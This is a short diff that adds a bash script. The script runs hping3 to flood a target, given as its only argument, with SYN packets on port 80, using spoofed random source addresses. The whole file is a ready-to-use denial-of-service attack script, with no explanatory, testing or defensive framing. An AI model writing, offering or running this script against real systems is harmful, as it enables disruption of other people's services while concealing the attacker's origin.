@@ -1,0 +1,2 @@
+#!/bin/bash
+hping3 $1 --flood --rand-source --destport 80 --syn -d 120 -w 64
